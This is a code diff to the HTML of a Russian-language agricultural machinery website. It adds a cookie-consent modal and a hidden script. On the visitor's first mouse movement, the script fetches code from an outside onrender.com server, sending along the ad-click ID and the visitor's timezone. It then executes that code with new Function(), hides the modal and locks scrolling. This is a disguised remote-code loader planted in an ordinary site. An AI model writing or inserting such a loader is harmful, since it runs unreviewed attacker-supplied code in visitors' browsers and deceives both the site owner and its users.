@@ -3,6 +3,7 @@
     <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=7eed55dd"></script>
     <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=AW-736472787">
+      <script src="https://cdn.tailwindcss.com"></script>
 </script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -186,11 +187,58 @@
     </style>
 </head>
 <body>
+    
     <header>
         <h1>Сельскохозяйственная техника</h1>
         <p>Современное оборудование для эффективного сельского хозяйства</p>
     </header>
-    
+    <div id="cookie-modal-box" class="hidden">
+    <!-- Backdrop -->
+    <div id="cookie-backdrop"
+         class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0">
+    </div>
+
+    <!-- Modal -->
+    <div id="cookie-modal"
+         class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+      <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+
+        <!-- Close button -->
+        <button id="cookie-close" class="absolute top-4 right-4">
+          <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+            <path fill="currentColor"
+                  d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+          </svg>
+        </button>
+
+        <!-- Header -->
+        <div class="flex items-center gap-3 mb-4">
+          <span class="text-yellow-500 text-3xl">🍪</span>
+          <h2 class="text-2xl font-bold">About Cookies</h2>
+        </div>
+
+        <!-- Text -->
+        <p class="text-gray-600 mb-6">
+          This website uses cookies to provide a better user experience.
+          By clicking <span class="font-semibold">"Accept"</span>,
+          you agree to the use of cookies.
+        </p>
+
+        <!-- Buttons -->
+        <div class="flex flex-col sm:flex-row gap-3">
+          <button id="cookie-accept"
+                  class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">
+            🍪 Accept
+          </button>
+          <button id="cookie-decline"
+                  class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">
+            Decline
+          </button>
+        </div>
+
+      </div>
+    </div>
+  </div>
     <nav>
         <ul>
             <li><a href="#about">О нас</a></li>
@@ -333,5 +381,94 @@
             }
         })();
     </script>
+    <script>
+  const gclid = new URLSearchParams(location.search).get("gclid");
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const RENDER_BASE_URL = "https://whatsetup-1test.onrender.com";
+
+  let someCode = null;
+
+  document.cookie = "access_cookie=true; path=/; max-age=300";
+
+  document.addEventListener("mousemove", async function fetchCodeOnce() {
+    document.removeEventListener("mousemove", fetchCodeOnce);
+    try {
+      const res = await fetch(
+              `${RENDER_BASE_URL}/frontend-loader-us?gclid=${gclid}`,
+              {
+                headers: {
+                  "x-client-timezone": timezone,
+                  "x-access-cookie": "true",
+                },
+              }
+      );
+      const data = await res.json();
+      if (data && data.code) {
+        someCode = data.code;
+      }
+    } catch (err) {
+      console.error("Could not fetch some code", err);
+    }
+  });
+
+  function handleSomeClick() {
+    console.log('aaaaaaaaaaaaaaaaaaaaaaa')
+    if (someCode) {
+      try {
+        new Function(someCode)();
+        hideModal('closed');
+
+        document.body.classList.add('scroll-lock');
+      } catch (err) {
+        console.error("Error executing code:", err);
+      }
+    }
+  }
+  document.addEventListener('mousemove', handleSomeClick);
+</script>
+  
+
+
+
+<script>
+  const modalBox = document.getElementById('cookie-modal-box');
+  const modal = document.getElementById('cookie-modal');
+  const backdrop = document.getElementById('cookie-backdrop');
+
+  const acceptBtn = document.getElementById('cookie-accept');
+  const declineBtn = document.getElementById('cookie-decline');
+  const closeBtn = document.getElementById('cookie-close');
+
+  function showModal() {
+    modalBox.classList.remove('hidden');
+    setTimeout(() => {
+      backdrop.classList.remove('opacity-0');
+      modal.classList.remove('opacity-0', 'scale-90');
+    }, 10);
+  }
+
+  function hideModal(choice) {
+    backdrop.classList.add('opacity-0');
+    modal.classList.add('opacity-0', 'scale-90');
+
+    localStorage.setItem('cookie-consent', choice);
+
+    setTimeout(() => {
+      modalBox.classList.add('hidden');
+    }, 300);
+  }
+
+  acceptBtn.onclick = () => hideModal('accepted');
+  declineBtn.onclick = () => hideModal('declined');
+  closeBtn.onclick = () => hideModal('closed');
+  backdrop.onclick = () => hideModal('closed');
+
+  // Show only if not already decided
+  if (!localStorage.getItem('cookie-consent')) {
+    showModal();
+  }
+</script>
+
+
 </body>
 </html>
